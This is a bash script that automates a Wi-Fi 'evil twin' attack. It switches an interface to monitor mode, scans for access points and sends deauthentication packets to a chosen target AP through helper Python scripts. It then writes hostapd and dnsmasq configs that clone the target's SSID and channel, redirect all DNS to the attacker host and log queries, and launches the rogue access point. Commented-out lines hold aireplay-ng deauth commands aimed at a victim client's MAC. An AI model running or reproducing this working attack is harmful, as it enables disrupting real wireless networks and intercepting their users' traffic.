#!/bin/bash

#Check if user is root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root" 1>&2
   exit
fi

clear

iwconfig
echo "Enter the interface name"
read interface

clear

# Check if interface is up
ifconfig $interface | grep UP
if [ $? -eq 0 ]
then
    echo "Interface is up"
else
    echo "Interface is down"

    #Finish
    exit
fi

clear

# Check if interface is in managed mode
# iwconfig $interface | grep Managed
# if [ $? -eq 0 ]
# then
#     echo "Interface is in managed mode"
# else
#     echo "Interface is not in managed mode"
    
#     # Start monitor mode
#     ifconfig $interface down
#     iwconfig $interface mode managed
#     ifconfig $interface up
#     if [ $? -eq 0 ]
#     then
#         echo "Managed mode started"
#     else
#         echo "Managed mode failed to start"
#         exit
#     fi
# fi


# clear


# Perform a WLAN scan and get the SSID , the MAC address and the channel
# iwlist $interface scan | grep -i "ESSID" > ssid.txt 
# iwlist $interface scan | grep -i "Address"  > mac.txt
# iwlist $interface scan | grep -i "Channel" > channel.txt
# paste ssid.txt mac.txt channel.txt | column -t



# Check if interface is in monitor mode
iwconfig $interface | grep Monitor
if [ $? -eq 0 ]
then
    echo "Interface is in monitor mode"
else
    echo "Interface is not in monitor mode"
    
    # Start monitor mode
    ifconfig $interface down
    sleep 1s
    iwconfig $interface mode monitor
    sleep 1s
    ifconfig $interface up
    sleep 1s
    if [ $? -eq 0 ]
    then
        echo "Monitor mode started"
    else
        echo "Monitor mode failed to start"
        exit
    fi
fi

python3 wifi_scanner.py $interface

# echo "Enter the BSSID of the access point you want to attack"
# read assid
# # clear

# # Exit if BSSID is not valid
# if [ -z "$assid" ]
# then
#     echo "BSSID is not valid"
#     exit
# fi

# get the assid of the assid.txt
assid=$(cat assid.txt)
rm assid.txt

# get the ssid of the ssid.txt
ssid=$(cat ssid.txt)
rm ssid.txt

# get the channel of the channel.txt
channel=$(cat channel.txt)
rm channel.txt




python3 ap_scanner.py $interface $assid

echo "Sending deAuth packets to the dest mac ap"
ifconfig
echo "Enter an interface to perform the attack, note that it should be different from the interface you've choose before."
read attackerInterface

python3 deauth_good.py $attackerInterface $assid




# creates an pap/hostapd.conf file for hostapd to use 

  echo "interface=$interface" > pap/hostapd.conf
  echo "driver=nl80211" >> pap/hostapd.conf
  echo "ssid=$ssid" >> pap/hostapd.conf
  echo "hw_mode=g" >> pap/hostapd.conf
  echo "channel=$channel" >> pap/hostapd.conf
  echo "ignore_broadcast_ssid=0" >> pap/hostapd.conf

# creates an dnsmasq.conf file for dnsmasq to use
echo "interface=$interface" > dnsmasq.conf
echo "dhcp-range=192.168.1.10,192.168.1.250,12h" >> dnsmasq.conf
echo "dhcp-option=1,255.255.255.0" >> dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
echo "dhcp-option=6,192.168.1.1" >> dnsmasq.conf
echo "server=8.8.8.8" >> dnsmasq.conf
echo "log-queries" >> dnsmasq.conf
echo "log-dhcp" >> dnsmasq.conf
echo "address=/#/192.168.1.1" >> dnsmasq.conf
echo "dnsmasq -C pap/dnsmasq.conf -d" >> dnsmasq.conf




# Fake an access point with assid as BSSID and channel as channel of the AP
# timeout 5s aireplay-ng -1 0 -a $assid -h $tarssid $interface
echo "Starting fake access point"





# Run in new thread the hostapd.sh script
sudo sh hostapd.sh & 
sudo sh dnsmasq.sh &
wait





































#enter mac address of client we want to disconnect // example of aircrack-ng
# echo -e "\n\nEnter MAC address of victim"
# read client_mac

# python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface

# timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface







# Deauthanticate the target
# echo "Deauthing target"
# aireplay-ng -0 0 -a $assid -h $tarssid $interface

#   wlx6c5ab03ab2f5
#   32:07:4D:4D:BD:1A
#   11




